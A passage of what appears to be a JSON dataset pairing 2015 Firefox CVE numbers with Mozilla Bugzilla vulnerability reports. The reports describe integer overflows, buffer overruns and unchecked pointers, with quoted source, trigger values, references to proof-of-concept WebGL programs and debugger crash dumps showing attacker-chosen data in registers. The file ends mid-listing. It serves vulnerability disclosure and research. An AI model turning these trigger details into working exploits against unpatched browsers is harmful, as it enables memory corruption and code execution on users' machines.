        "description": "User Agent: Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0 Build ID: 20150305021524 Steps to reproduce: ConvertDialogOptions (38.0.1\\dom\\base\\nsGlobalWindow.cpp) routinely references memory that it does not own, referencing iterators that could == end without first checking. See lines 9071, 9088, 9092, 9102, 9108, etc., which use expressions of the form: while (nsCRT::IsAsciiSpace(*iter) && iter != end) {... This function can also enter a long loop. If the aOptions string contains the single character \" \", followed in memory by \";\", the function will run well beyond the end of the aOptions argument, parsing data it does not own until it access-violates. Lines 9071-73 skip the space and increment iter to == end. Lines from 9074-91 do nothing. Then the if statement on lines 9092-97 dereferences iter, finds that *iter is \";\", increments iter so that it is no longer == end, and continues the outer while (iter != end) loop (line 9069), which then runs until the code increments iter to point to an inaccessible area of memory and dereferences it, causing an access violation. This can occur because aOptions isa nsAString, which is not necessarily zero-terminated according to https://developer.mozilla.org/en-US/docs/Mozilla/Tech/XPCOM/Reference/Glue_classes/nsAString/BeginReading . I think the worst consequence of these bugs is a crash, but I can't rule out a compromise of sensitive data and/or overwriting of unowned portions of Firefox's address space."
      }
    ],
    "CVE-2015-4522": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1170794",
        "title": "Overflow in nsUnicodeToUTF8::GetMaxLength can create memory-safety bugs in callers",
        "description": "User Agent: Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0 Build ID: 20150305021524 Steps to reproduce: nsUnicodeToUTF8::GetMaxLength (38.0.1\\intl\\uconv\\nsUnicodeToUTF8.cpp) computes the destination string length *aDestLength without checking for overflow. This means that it can return a destination string length _smaller_ than the source string length, which can then cause memory-safety bugs in its caller: 15: NS_IMETHODIMP nsUnicodeToUTF8::GetMaxLength(const char16_t * aSrc, 16: int32_t aSrcLength, 17: int32_t * aDestLength) 18: { 19: // aSrc is interpreted as UTF16, 3 is normally enough. 20: // But when previous buffer only contains part of the surrogate pair, we 21: // need to complete it here. If the first word in following buffer is not 22: // in valid surrogate range, we need to convert the remaining of last buffer 23: // to 3 bytes. 24: *aDestLength = 3*aSrcLength + 3; 25: return NS_OK; 26: } If aSrcLength >= 0x2aaaaaaa, line 24 computes a negative value and returns it in *aDestLength. If the caller then uses this value without checking it, it could, for example, fail to allocate enough space for a string, causing overwriting of unowned memory. For example, EncodeString (38.0.1\\netwerk\\base\\nsStandardURL.cpp) uses the returned value to allocate a buffer: 66: static nsresult 67: EncodeString(nsIUnicodeEncoder *encoder, const nsAFlatString &str, nsACString &result) 68: { 69: nsresult rv; 70: int32_t len = str.Length(); 71: int32_t maxlen; 72: 73: rv = encoder->GetMaxLength(str.get(), len, &maxlen); 74: if (NS_FAILED(rv)) 75: return rv; 76: 77: char buf[256], *p = buf; 78: if (uint32_t(maxlen) > sizeof(buf) - 1) { 79: p = (char *) malloc(maxlen + 1); 80: if (!p) 81: return NS_ERROR_OUT_OF_MEMORY; 82: } 83: 84: rv = encoder->Convert(str.get(), &len, p, &maxlen); 85: if (NS_FAILED(rv)) 86: goto end; 87: ... 92: p[maxlen] = 0; 93: result.Assign(p); 94: 95: len = sizeof(buf) - 1; 96: rv = encoder->Finish(buf, &len); 97: if (NS_FAILED(rv)) 98: goto end; 99: buf[len] = 0; ... If str.Length() == 0x55555554 and encoder isa nsUnicodeToUTF8, then nsUnicodeToUTF8::GetMaxLength will compute maxlen == 0xffffffff (== -1), and line 79 will compute and allocate a buffer of size -1+1 == 0. Line 84 won't cause a problem because of how nsUnicodeToUTF8::Convert is implemented, but line 92 will zero the byte at p-1. This write will cause unpredictable effects, possibly including disclosure of sensitive information."
      }
    ],
    "CVE-2015-5961": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1123433",
        "title": "COPPA error screen in FxAccounts signup allows loading arbitrary web content into B2G root process",
        "description": "In following the STR for bug 1109531 on master, I noticed that an external website (hosted at ftc.gov) gets loaded into the b2g root process. This seems bad, as we don't control this content and a user clicking on links from that page can theoretically load arbitrary content into the b2g root process. STR (basically copied from bug 1109531): 1. go to settings > Firefox accounts 2. click on \"create account or sign in\" 3. enter a bogus email address that has no firefox account associated with it (e.g. foo@bar.asdlkfjlaskfdj) and hit next 4. In the age verification drop-down pick a recent year (e.g. 2014) and hit next 5. On the COPPA error message screen that shows up click on \"learn more\""
      }
    ],
    "CVE-2015-5962": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1145389",
        "title": "Upper bound check bypass due to signed compare in SharedBufferManagerParent::RecvAllocateGrallocBuffer",
        "description": "The upper bound check of the 'width' and 'height' field[1] can be bypassed using negative values that are supplied by a malicious child through the IPC message 'Msg_AllocateGrallocBuffer' in the field 'size'. The assembler code for the mentioned checks looks like this (flame device): > cmp.w r3, #4096 > bgt.n <destination> According to the ARM Reference Manual 'bgt' is a signed compare. I verified it using gdb. To modify the IPC message I used my hooking engine to hook the Pickle::Read* functions inside the b2g process at runtime and swapped the values (similar to the faulty fuzzer). I supplied the log file from the hooks as an attachment. 'width' and 'height' (as well as the other two parameters) are used to allocate GPU memory, by creating a 'GraphicBuffer'[2] instance, the actual allocation happens inside a device specific library called 'gralloc.<device>.so' (for the flame it is called: 'gralloc.msm8610.so'[3]) I am not sure what impact this could have. I tested a couple of values for 'width' and 'height', when I set them both to 0xffffff00 then I get a NULL pointer deref: > ldr.w r3, [r10] with r10 being 0 [4]. But I don't know how this relates to the negative size of the graphic buffer. If I set the first value (I am missing the definition of the 'IntSize' struct so I can't tell whether it is the 'height' or 'width') to 0x80001100 and the second to 0x1000, so that the product of the two gives me a higher value than the allowed 4096 and 4096, the process freezes, gdb doesn't show anything, nothing responds and after a while the process is killed. So that's what I got regarding the impact, but I assume we shouldn't allow negative values for width and the height. [1] http://mxr.mozilla.org/mozilla-central/source/gfx/layers/ipc/SharedBufferManagerParent.cpp?rev=da8b000c08c6#223 [2] ./B2G/frameworks/native/libs/ui/GraphicBuffer.cpp [3] ./B2G/hardware/qcom/display/libgralloc/gpu.cpp - gralloc_alloc(...) [4] http://mxr.mozilla.org/mozilla-central/source/gfx/layers/client/TiledContentClient.cpp?rev=78dcb3a426f2#1222"
      }
    ],
    "CVE-2015-7174": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1172055",
        "title": "Overflow in nsAttrAndChildArray::GrowBy causes memory-safety bug",
        "description": "User Agent: Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0 Build ID: 20150305021524 Steps to reproduce: nsAttrAndChildArray::GrowBy (38.0.1\\dom\\base\\nsAttrAndChildArray.cpp) can overflow if mBufferSize becomes very large, causing a realloc to a tiny buffer size. Other code in the class subsequently writes to unallocated space, potentially permitting the execution of attacker-chosen code, as by modifying an object's virtual-function table: 763: bool 764: nsAttrAndChildArray::GrowBy(uint32_t aGrowSize) 765: { 766: uint32_t size = mImpl ? mImpl->mBufferSize + NS_IMPL_EXTRA_SIZE : 0; 767: uint32_t minSize = size + aGrowSize; 768: 769: if (minSize <= ATTRCHILD_ARRAY_LINEAR_THRESHOLD) { 770: do { 771: size += ATTRCHILD_ARRAY_GROWSIZE; 772: } while (size < minSize); 773: } 774: else { 775: size = 1u << mozilla::CeilingLog2(minSize); 776: } 777: 778: bool needToInitialize = !mImpl; 779: Impl* newImpl = static_cast<Impl*>(moz_realloc(mImpl, size * sizeof(void*))); 780: ... If size (from mImpl->mBufferSize) is very close to 0xffffffff, line 767 can overflow. If the condition on line 769 is satisfied, size also can overflow. If the condition on line 767 is not satisfied, line 775 computes a tiny size from minSize. In either case, line 779 allocates a buffer far too small to contain all the existing data, and other code in the class writes to the unallocated area."
      }
    ],
    "CVE-2015-7175": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1172189",
        "title": "Overflow in XULContentSinkImpl::AddText causes memory-safety bug",
        "description": "User Agent: Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0 Build ID: 20150305021524 Steps to reproduce: This bug is just like https://bugzilla.mozilla.org/show_bug.cgi?id=1172187 , but in XULContentSinkImpl::AddText (38.0.1\\dom\\xul\\nsXULContentSink.cpp), line 1075: 1075: mTextSize += aLength; 1076: mText = (char16_t *) moz_realloc(mText, sizeof(char16_t) * mTextSize);"
      }
    ],
    "CVE-2015-7176": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1174479",
        "title": "Bad sscanf argument in AnimationThread overruns stack variable",
        "description": "AnimationThread (38.0.1\\widget\\gonk\\libdisplay\\BootAnimation.cpp line 449) can overrun a stack variable if an operating system file contains oversize strings. If that happens, it also pushes elements into an std::vector that contain unterminated strings. This problem is on lines 523-24: 253: struct AnimationPart { 254: int32_t count; 255: int32_t pause; 256: char path[256]; 257: vector<AnimationFrame> frames; 258: }; ... 490: vector<AnimationPart> parts; ... 519: AnimationPart part; ... 523: } else if (sscanf(line, \"p %d %d %s\", 524: &part.count, &part.pause, part.path)) { 525: parts.push_back(part); ... The \"%s\" specifier will write into part.path as many characters as are available, thus potentially overrunning that variable. The variable \"line\" that line 523 parses comes from an operating system file that is documented on line 492 et seq. It is unclear what security effects this overrun can have, but at least the data causing the overrun appears to be under operating system control."
      }
    ],
    "CVE-2015-7177": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1186725",
        "title": "Memory-safety bug in InitTextures",
        "description": "InitTextures (gfx\\layers\\IMFYCbCrImage.cpp) can cause its callers to use a wild pointer to read and/or write data to memory. This is because it calls IDirect3DSurface9::LockRect without checking the return code. Instead, it checks whether the resulting aLockedRect.pBits member == nullptr. It then returns aLockedRect to its callers, which use its members to read and/or write data into memory that (on success) would be mapped to a GPU buffer. The problem is that InitTextures receives aLockedRect from its caller, and does not itself initialize it. As it happens, its only known caller (UploadData) passes a reference to an uninitialized automatic D3DLOCKED_RECT to InitTextures. D3DLOCKED_RECT also lacks a constructor, so it does not initialize itself. The upshot is that if LockRect fails (as under OOM conditions), UploadData will overwrite (probably a considerable amount of) memory at some arbitrary place in Firefox's address space. 116: static bool UploadData(IDirect3DDevice9* aDevice, 117: RefPtr<IDirect3DTexture9>& aTexture, 118: HANDLE& aHandle, 119: uint8_t* aSrc, 120: const gfx::IntSize& aSrcSize, 121: int32_t aSrcStride) 122: { 123: RefPtr<IDirect3DSurface9> surf; 124: D3DLOCKED_RECT rect; 125: aTexture = InitTextures(aDevice, aSrcSize, D3DFMT_A8, surf, aHandle, rect); 126: if (!aTexture) { 127: return false; 128: } ... 59: static TemporaryRef<IDirect3DTexture9> 60: InitTextures(IDirect3DDevice9* aDevice, 61: const IntSize &aSize, 62: _D3DFORMAT aFormat, 63: RefPtr<IDirect3DSurface9>& aSurface, 64: HANDLE& aHandle, 65: D3DLOCKED_RECT& aLockedRect) 66: { ... 92: aSurface->LockRect(&aLockedRect, nullptr, 0); 93: if (!aLockedRect.pBits) { 94: NS_WARNING(\"Could not lock surface\"); 95: return nullptr; 96: } 97: 98: return result; 99: }"
      }
    ],
    "CVE-2015-7178": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1189860",
        "title": "Missing bounds check causes memory-safety bug in ProgramBinary::linkAttributes",
        "description": "ProgramBinary::linkAttributes (gfx\\angle\\src\\libGLESv2\\ProgramBinary.cpp) does not bounds-check accesses to its mShaderAttributes array. Because this is a fixed-length array (gfx\\angle\\src\\libGLESv2\\renderer\\ProgramImpl.h): 122: sh::Attribute mShaderAttributes[gl::MAX_VERTEX_ATTRIBS]; where 17: MAX_VERTEX_ATTRIBS = 16, (gfx\\angle\\src\\libGLESv2\\Constants.h), and because of the absence of bounds checks elsewhere, it is possible to create more shader attributes than mShaderAttributes can accommodate. This causes ProgramBinary::linkAttributes to write data beyond the end of mShaderAttributes (and indeed beyond the end of *mProgram) into whatever other heap object lives there. Attached is a proof-of-concept WebGL program [1] that causes this overwriting. The best way to observe it is to attach a debugger to FF debug 39.0, set a breakpoint on ProgramBinary::linkAttributes: 683: mProgram->getShaderAttributes()[attributeIndex] = attribute; and observe how attributesIndex gets incremented beyond the end of mShaderAttributes. You can then open a memory window to ((char *) &mProgram->mShaderAttributes) + sizeof (mProgram->mShaderAttributes) and step into the assignment. In my limited testing, the memory beyond the end of mShaderAttributes contains data that makes line 50 of ShaderVariable::operator= (gfx\\angle\\src\\compiler\\translator\\ShaderVars.cpp) fail with a write-to-nullptr: 45: ShaderVariable &ShaderVariable::operator=(const ShaderVariable &other) 46: { 47: type = other.type; 48: precision = other.precision; 49: name = other.name; 50: mappedName = other.mappedName; 51: arraySize = other.arraySize; 52: staticUse = other.staticUse; 53: fields = other.fields; 54: structName = other.structName; 55: return *this; 56: } after lines 47-49 have written 5 or so DWORDs into the unowned memory. However, the unowned memory probably can contain anything at all, and if the memory occupied by, e.g., mappedName were to contain a valid pointer to heap memory, the assignment on line 50 would free it, causing havoc down the road. The proof-of-concept also crashes 40.0b8 Win64 release, in which it writes about 10 DWORDs of data into the unowned memory before crashing. I have not yet examined whether it frees any unowned memory before crashing. [1] See attached HTML and JS; extract and name the JS \"poc.js\" and put it in the same folder as the extracted HTML, then load the HTML."
      }
    ],
    "CVE-2015-7179": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1190526",
        "title": "Overflow in VertexBufferInterface::reserveVertexSpace causes memory-safety bug",
        "description": "VertexBufferInterface::reserveVertexSpace (gfx\\angle\\src\\libGLESv2\\renderer\\d3d\\VertexBuffer.cpp) can incur an overflow with a specially-crafted set of shader attribute arrays. The overflow causes VertexBufferInterface::storeVertexAttributes to fail to allocate a large-enough buffer, then to write the contents of one or more shader attribute arrays (whose contents an attacker can prescribe) far beyond the buffer's end. This bug can be manifested under Win64 with D3D 11 (see attached proof-of-concept [0] and details below) and probably also under Linux x64. Someone with more knowledge of WebGL might also be able to manifest this bug under Win32 and other 32-bit platforms. Details: ------------------------------------------------------------------------------------------------------ The bug is in VertexBufferInterface::reserveVertexSpace: 135: gl::Error VertexBufferInterface::reserveVertexSpace(const gl::VertexAttribute &attrib, GLsizei count, GLsizei instances) 136: { 137: gl::Error error(GL_NO_ERROR); 138: 139: unsigned int requiredSpace; 140: error = mVertexBuffer->getSpaceRequired(attrib, count, instances, &requiredSpace); 141: if (error.isError()) 142: { 143: return error; 144: } 145: 146: // Protect against integer overflow 147: if (mReservedSpace + requiredSpace < mReservedSpace) 148: { 149: return gl::Error(GL_OUT_OF_MEMORY, \"Unable to reserve %u extra bytes in internal vertex buffer, \" 150: \"it would result in an overflow.\", requiredSpace); 151: } 152: 153: mReservedSpace += requiredSpace; 154: 155: // Align to 16-byte boundary 156: mReservedSpace = rx::roundUp (mReservedSpace, 16u); 157: 158: return gl::Error(GL_NO_ERROR); 159: } The checks on line 147-51 close the overflow window, but the round-up on line 156 reopens it just a crack. If the WebGL program uses 8 attribute arrays of size 0x1FFFFFF8, mReservedSpace on line 156 rounds up each time (from 0x1FFFFFF8 to 0x20000000 on the 1st array, 0x3ffffff8 to 0x40000000 on the 2nd) and finally overflows from 0xFFFFFFF8 to 0 on the last array. Later, when VertexBufferInterface::storeVertexAttributes is called to save the attributes into the buffer, it calls StreamingVertexBufferInterface::reserveSpace with that same buffer size (0). reserveSpace then leaves the existing default buffer of length 0x100000 bytes [1] in place: 209: gl::Error StreamingVertexBufferInterface::reserveSpace(unsigned int size) 210: { 211: unsigned int curBufferSize = getBufferSize(); 212: if (size > curBufferSize) 213: { 214: gl::Error error = setBufferSize(std::max(size, 3 * curBufferSize / 2)); 215: if (error.isError()) 216: { 217: return error; 218: } 219: setWritePosition(0); 220: } 221: else if (getWritePosition() + size > curBufferSize) 222: { 223: gl::Error error = discard(); 224: if (error.isError()) 225: { 226: return error; 227: } 228: setWritePosition(0); 229: } 230: 231: return gl::Error(GL_NO_ERROR); 232: } (size == 0, so control skips from line 212 to line 221, and thence to line 231). Finally, VertexBufferInterface::storeVertexAttributes is called to copy an entire attribute array into the (0x100000-byte) buffer: 116: error = mVertexBuffer->storeVertexAttributes(attrib, currentValue, start, count, instances, mWritePosition); Since all of the proof-of-concept attribute arrays are 0x1FFFFFF8 bytes, this causes a potentially huge overrun. In testing the POC several times, this has had various effects: 1. Writing into a structure from which the video driver extracts a pointer, resulting in an attempt to read an invalid address (and probably other undetected corruption before the exception). This example is included, below. I saw this problem twice in different guises. 2. Writing into a function pointer, causing the video driver to attempt to call a function at an invalid address. 3. Writing into a function pointer, causing nss3.dll!PR_GetEnv to attempt to call a function at an invalid address. 4. A stack overflow with unknown corruption beforehand. 5. The display going blank, then partially repainting, with the message \"Display driver nvlddmkm stopped responding and has successfully recovered\" popping up, followed by an exception hitting an inaccessible page. 6. Hitting an inaccessible page, causing an exception, after overwriting varied amounts of unowned memory with no visible effects. ------------------------------------------------------------------------------------------------------ Manifesting the bug The following crash occured while running the attached proof-of-concept program. The setup was to run FF 40b8 x64 on Win7 SP1 (I wasn't able to find 39.0 x64. Where is it distributed?). I attached the VS debugger to FF, then opened 4 windows and navigated to the following sites in 3 of them: Dynamic procedural terrain (http://alteredqualia.com/three/examples/webgl_terrain_dynamic.html ) Bill Nye Reading Mean Tweets (https://www.youtube.com/watch?v=mm4Rwyi-k08 ) WebGL Aquarium (http://webglsamples.org/aquarium/aquarium.html ) [See note [2]] I then ran the proof-of-concept program in the 4th window. At the \"unresponsive script\" alert box, I clicked \"continue\". A few seconds later the following crash appeared in VS: Exception thrown at 0x000007FEEA9CE79A (nvwgf2umx.dll) in firefox.exe: 0xC0000005: Access violation reading location 0xFFFFFFFFFFFFFFFF. Investigating, I found that the actual address that was read to cause the exception was different. Reading the code stream: 000007FEEA9CE760 mov qword ptr [rsp+10h],rbx 000007FEEA9CE765 push rdi 000007FEEA9CE766 mov rcx,qword ptr [r9+20h] 000007FEEA9CE76A or r11,0FFFFFFFFFFFFFFFFh 000007FEEA9CE76E xor r10d,r10d 000007FEEA9CE771 xor ebx,ebx 000007FEEA9CE773 mov rdi,rdx 000007FEEA9CE776 test rcx,rcx 000007FEEA9CE779 je 000007FEEA9CE806 000007FEEA9CE77F mov rdx,qword ptr [rcx+40h] 000007FEEA9CE783 mov qword ptr [rsp+10h],rsi 000007FEEA9CE788 mov rax,qword ptr [rdx] 000007FEEA9CE78B test rax,rax 000007FEEA9CE78E je 000007FEEA9CE7BD 000007FEEA9CE790 mov r10,qword ptr [rax+1E8h] 000007FEEA9CE797 mov rbx,rdx > 000007FEEA9CE79A mov rax,qword ptr [r10+118h] 000007FEEA9CE7A1 mov r11,qword ptr [r10+110h] 000007FEEA9CE7A8 cmp r11,rax 000007FEEA9CE7AB cmovbe r11,rax 000007FEEA9CE7AF mov rax,qword ptr [r10+120h] 000007FEEA9CE7B6 cmp r11,rax We find that r10 at the crashing instruction is 0x433a0000433a0000, which is exactly the bad data that the POC writes [3]. r10 came from [rax+1E8h], which contained: 0x000000003D384F98 00 00 3a 43 00 00 3a 43 00 00 3a 43 00 00 3a 43 ..:C..:C..:C..:C 0x000000003D384FA8 00 00 3a 43 00 00 3a 43 00 00 3a 43 00 00 3a 43 ..:C..:C..:C..:C 0x000000003D384FB8 00 00 3a 43 00 00 3a 43 00 00 3a 43 00 00 3a 43 ..:C..:C..:C..:C 0x000000003D384FC8 00 00 3a 43 00 00 3a 43 00 00 3a 43 00 00 3a 43 ..:C..:C..:C..:C 0x000000003D384FD8 00 00 3a 43 00 00 3a 43 00 00 3a 43 00 00 3a 43 ..:C..:C..:C..:C 0x000000003D384FE8 00 00 3a 43 00 00 3a 43 00 00 3a 43 00 00 3a 43 ..:C..:C..:C..:C The thread's registers were: RAX = 000000003D384DB0 RBX = 000000000F36D540 RCX = 000000000F36B180 RDX = 000000000F36D540 RSI = 0000000000000002 RDI = 000000000FBFE958 R8 = 000000000FBFE9A8 R9 = 000000000F36D770 R10 = 433A0000433A0000 R11 = FFFFFFFFFFFFFFFF R12 = 0000000000000002 R13 = 0000000000000002 R14 = 00000000542CA6A0 R15 = 000000000F36D770 RIP = 000007FEEA9CE79A RSP = 000000000FBFE910 RBP = 00000000004C2DD0 EFL = 00010202 And the thread's stack was: > nvwgf2umx.dll!000007feea9ce79a() Unknown nvwgf2umx.dll!000007feea94b040() Unknown nvwgf2umx.dll!000007feea94ac14() Unknown nvwgf2umx.dll!000007feea3b944e() Unknown nvwgf2umx.dll!000007feea2c2df4() Unknown nvwgf2umx.dll!000007feea3ea279() Unknown d3d11.dll!CResource<struct ID3D11Resource>::Map<0,5>(class CContext *,class CResource<struct ID3D11Resource> *,unsigned int,enum D3D11_MAP,unsigned int,struct D3D11_MAPPED_SUBRESOURCE *) Unknown d3d11.dll!CContext::ID3D11DeviceContext1_Map_<1>(struct ID3D11DeviceContext1 *,struct ID3D11Resource *,unsigned int,enum D3D11_MAP,unsigned int,struct D3D11_MAPPED_SUBRESOURCE *) Unknown xul.dll!mozilla::layers::CompositorD3D11::UpdateConstantBuffers() Line 1347 C++ xul.dll!mozilla::layers::CompositorD3D11::ClearRect(const mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits> & aRect) Line 600 C++ xul.dll!mozilla::layers::CompositorD3D11::BeginFrame(const nsIntRegion & aInvalidRegion, const mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits> * aClipRectIn, const mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits> & aRenderBounds, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits> * aClipRectOut, mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits> * aRenderBoundsOut) Line 1076 C++ xul.dll!mozilla::layers::LayerManagerComposite::Render() Line 718 C++ xul.dll!mozilla::layers::LayerManagerComposite::EndTransaction(void (mozilla::layers::PaintedLayer *, gfxContext *, const nsIntRegion &, mozilla::layers::DrawRegionClip, const nsIntRegion &, void *) * aCallback, void * aCallbackData, mozilla::layers::LayerManager::EndTransactionFlags aFlags) Line 319 C++ xul.dll!mozilla::layers::LayerManagerComposite::EndEmptyTransaction (mozilla::layers::LayerManager::EndTransactionFlags aFlags) Line 262 C++ xul.dll!mozilla::layers::CompositorParent::CompositeToTarget(mozilla::gfx::DrawTarget * aTarget, const mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> * aRect) Line 1143 C++ xul.dll!mozilla::layers::CompositorVsyncScheduler::Composite(mozilla::TimeStamp aVsyncTimestamp) Line 519 C++ xul.dll!RunnableMethod<SoftwareDisplay,void (__cdecl SoftwareDisplay::*)(mozilla::TimeStamp) __ptr64,Tuple1<mozilla::TimeStamp> >::Run() Line 311 C++ xul.dll!MessageLoop::DoWork() Line 456 C++ xul.dll!base::MessagePumpForUI::DoRunLoop() Line 217 C++ xul.dll!base::MessagePumpWin::Run(base::MessagePump::Delegate * delegate) Line 78 C++ xul.dll!MessageLoop::RunHandler() Line 227 C++ xul.dll!MessageLoop::Run() Line 201 C++ xul.dll!base::Thread::ThreadMain() Line 173 C++ xul.dll!`anonymous namespace'::ThreadFunc(void * closure) Line 27 C++ kernel32.dll!BaseThreadInitThunk() Unknown ntdll.dll!RtlUserThreadStart() Unknown and the thread's description was: Not Flagged > 0x00000CF4 0x00 Worker Thread xul.dll!`anonymous namespace'::ThreadFunc nvwgf2umx.dll!000007feea9ce79a Normal BUT the main thread was still in memcpy, still overwriting memory that it didn't own: Not Flagged 0x000012B0 0x00 Main Thread Main Thread msvcr120.dll!memcpy Normal and its stack was: msvcr120.dll!memcpy() Line 357 Unknown > libGLESv2.dll!rx::VertexBuffer11::storeVertexAttributes(const gl::VertexAttribute & attrib, const gl::VertexAttribCurrentValueData & currentValue, int start, int count, int instances, unsigned int offset) Line 122 C++ libGLESv2.dll!rx::VertexBufferInterface::storeVertexAttributes(const gl::VertexAttribute & attrib, const gl::VertexAttribCurrentValueData & currentValue, int start, int count, int instances, unsigned int * outStreamOffset) Line 116 C++ libGLESv2.dll!rx::VertexDataManager::storeAttribute(const gl::VertexAttribute & attrib, const gl::VertexAttribCurrentValueData & currentValue, rx::TranslatedAttribute * translated, int start, int count, int instances) Line 295 C++ libGLESv2.dll!rx::VertexDataManager::prepareVertexData(const gl::State & state, int start, int count, rx::TranslatedAttribute * translated, int instances) Line 131 C++ libGLESv2.dll!rx::Renderer11::applyVertexBuffer(const gl::State & state, int first, int count, int instances) Line 994 C++ libGLESv2.dll!gl::Context::drawArrays(unsigned int mode, int first, int count, int instances) Line 1786 C++ libGLESv2.dll!glDrawArrays(unsigned int mode, int first, int count) Line 1387 C++ xul.dll!mozilla::gl::GLContext::fDrawArrays(unsigned int mode, int first, int count) Line 1144 C++ xul.dll!mozilla::WebGLContext::DrawArrays(unsigned int mode, int first, int count) Line 142 C++ xul.dll!mozilla::dom::WebGLRenderingContextBinding::drawArrays(JSContext * cx, JS::Handle<JSObject *> obj, mozilla::WebGLContext * self, const JSJitMethodCallArgs & args) Line 10758 C++ xul.dll!mozilla::dom::GenericBindingMethod(JSContext * cx, unsigned int argc, JS::Value * vp) Line 2615 C++ xul.dll!js::Invoke(JSContext * cx, JS::CallArgs args, js::MaybeConstruct construct) Line 753 C++ xul.dll!Interpret(JSContext * cx, js::RunState & state) Line 2962 C++ xul.dll!js::RunScript(JSContext * cx, js::RunState & state) Line 683 C++ xul.dll!js::Invoke(JSContext * cx, JS::CallArgs args, js::MaybeConstruct construct) Line 756 C++ xul.dll!js::Invoke(JSContext * cx, const JS::Value & thisv, const JS::Value & fval, unsigned int argc, const JS::Value * argv, JS::MutableHandle<JS::Value> rval) Line 790 C++ xul.dll!mozilla::dom::EventHandlerNonNull::Call(JSContext * cx, JS::Handle<JS::Value> aThisVal, mozilla::dom::Event & event, JS::MutableHandle<JS::Value> aRetVal, mozilla::ErrorResult & aRv) Line 260 C++ xul.dll!mozilla::dom::EventHandlerNonNull::Call<nsISupports * __ptr64>(nsISupports * const & thisVal, mozilla::dom::Event & event, JS::MutableHandle<JS::Value> aRetVal, mozilla::ErrorResult & aRv, const char * aExecutionReason, mozilla::dom::CallbackObject::ExceptionHandling aExceptionHandling, JSCompartment * aCompartment) Line 351 C++ xul.dll!mozilla::JSEventHandler::HandleEvent(nsIDOMEvent * aEvent) Line 216 C++ xul.dll!mozilla::EventListenerManager::HandleEventInternal(nsPresContext * aPresContext, mozilla::WidgetEvent * aEvent, nsIDOMEvent * * aDOMEvent, mozilla::dom::EventTarget * aCurrentTarget, nsEventStatus * aEventStatus) Line 1129 C++ xul.dll!mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem> & aChain, mozilla::EventChainPostVisitor & aVisitor, mozilla::EventDispatchingCallback * aCallback, mozilla::ELMCreationDetector & aCd) Line 301 C++ xul.dll!mozilla::EventDispatcher::Dispatch(nsISupports * aTarget, nsPresContext * aPresContext, mozilla::WidgetEvent * aEvent, nsIDOMEvent * aDOMEvent, nsEventStatus * aEventStatus, mozilla::EventDispatchingCallback * aCallback, nsTArray<mozilla::dom::EventTarget *> * aTargets) Line 638 C++ xul.dll!nsDocumentViewer::LoadComplete(nsresult aStatus) Line 1000 C++ xul.dll!nsDocShell::EndPageLoad(nsIWebProgress * aProgress, nsIChannel * aChannel, nsresult aStatus) Line 7562 C++ xul.dll!nsDocShell::OnStateChange(nsIWebProgress * aProgress, nsIRequest * aRequest, unsigned int aStateFlags, nsresult aStatus) Line 7371 C++ xul.dll!nsDocLoader::DoFireOnStateChange(nsIWebProgress * const aProgress, nsIRequest * const aRequest, int & aStateFlags, const nsresult aStatus) Line 1250 C++ xul.dll!nsDocLoader::doStopDocumentLoad(nsIRequest * request, nsresult aStatus) Line 829 C++ xul.dll!nsDocLoader::DocLoaderIsEmpty(bool aFlushLayout) Line 721 C++ xul.dll!nsDocLoader::OnStopRequest(nsIRequest * aRequest, nsISupports * aCtxt, nsresult aStatus) Line 606 C++ xul.dll!nsLoadGroup::RemoveRequest(nsIRequest * request, nsISupports * ctxt, nsresult aStatus) Line 652 C++ xul.dll!nsDocument::DoUnblockOnload() Line 9160 C++ xul.dll!nsDocument::UnblockOnload(bool aFireSync) Line 9089 C++ xul.dll!nsDocument::DispatchContentLoadedEvents() Line 5225 C++ xul.dll!nsRunnableMethodImpl<void (__cdecl imgRequestProxy::*)(void) __ptr64,1>::Run() Line 811 C++ xul.dll!nsThread::ProcessNextEvent(bool aMayWait, bool * aResult) Line 872 C++ xul.dll!mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate * aDelegate) Line 95 C++ xul.dll!MessageLoop::RunHandler() Line 227 C++ xul.dll!MessageLoop::Run() Line 201 C++ xul.dll!nsBaseAppShell::Run() Line 167 C++ xul.dll!nsAppShell::Run() Line 180 C++ xul.dll!nsAppStartup::Run() Line 281 C++ xul.dll!XREMain::XRE_mainRun() Line 4079 C++ xul.dll!XREMain::XRE_main(int argc, char * * argv, const nsXREAppData * aAppData) Line 4170 C++ xul.dll!XRE_main(int argc, char * * argv, const nsXREAppData * aAppData, unsigned int aFlags) Line 4260 C++ firefox.exe!do_main(int argc, char * * argv, nsIFile * xreDirectory) Line 214 C++ firefox.exe!NS_internal_main(int argc, char * * argv) Line 480 C++ firefox.exe!wmain(int argc, wchar_t * * argv) Line 138 C++ firefox.exe!__tmainCRTStartup() Line 255 C kernel32.dll!BaseThreadInitThunk() Unknown ntdll.dll!RtlUserThreadStart() Unknown Examining the libGLESv2.dll!rx::VertexBuffer11::storeVertexAttributes frame, we find that the code used the following parameters: 0x000000003bed0000 pData + 0x00000000000e0a20 offset = 0x000000003BFB0A20 attribute buffer base 0x000000003C0B0A1F attribute buffer end 0x000000003D384F98 is the address from which the video driver read its pointer Examining the main thread code memcpy frame, we see that the thread stopped at: 000007FEF6BBC623 nop word ptr [rax+rax] 000007FEF6BBC630 mov rax,qword 